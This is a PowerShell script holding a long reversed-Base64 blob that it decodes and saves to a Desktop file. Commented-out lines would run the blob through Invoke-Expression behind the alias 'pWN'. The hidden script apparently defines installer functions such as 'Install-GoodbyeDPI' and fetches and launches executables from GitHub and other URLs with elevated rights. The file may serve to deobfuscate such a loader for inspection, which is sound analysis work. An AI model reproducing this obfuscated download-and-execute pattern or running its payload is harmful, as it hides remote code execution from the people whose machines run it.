$R = "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"; 
$txt = $R.ToCharArray(); 
[array]::Reverse($txt); 
$bnb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $txt)); 
Set-Content -Path "$home\Desktop\decodedshit.txt" -Value $bnb
#$exp = "Invoke-Expression"; 
#New-Alias -Name pWN -Value $exp -Force; pWN $bnb